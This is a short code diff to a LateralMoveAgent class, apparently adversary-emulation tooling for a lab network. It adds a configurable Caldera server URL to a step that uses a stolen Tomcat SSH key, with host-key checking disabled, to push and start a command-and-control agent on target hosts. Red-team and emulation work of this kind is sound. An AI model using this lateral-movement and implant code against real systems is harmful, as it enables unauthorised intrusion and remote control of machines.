@@ -26,6 +26,7 @@ class LateralMoveAgent(BaseAgent):
         target_host: str,
         credential: Credential = None,
         pivot_runner: CommandRunner = None,
+        caldera_server_url: str = None,
     ) -> dict:
         group = target_host  # use the host IP as the Caldera group label
 
@@ -41,7 +42,9 @@ class LateralMoveAgent(BaseAgent):
                     # so this path only works when the target can reach Caldera directly.
                     # For the DB (intnet, no egress) run redeploy_relay.sh first so the
                     # agent is already beaconing and the block above returns a paw.
-                    deploy_cmd = self.cnc.agent_deploy_command(group)
+                    deploy_cmd = self.cnc.agent_deploy_command(
+                        group, **({"server_url": caldera_server_url} if caldera_server_url else {})
+                    )
                     ssh_cmd = (
                         f"ssh -o StrictHostKeyChecking=no -i /opt/tomcat/.ssh/id_rsa "
                         f"{credential.username}@{target_host} '{deploy_cmd}'"
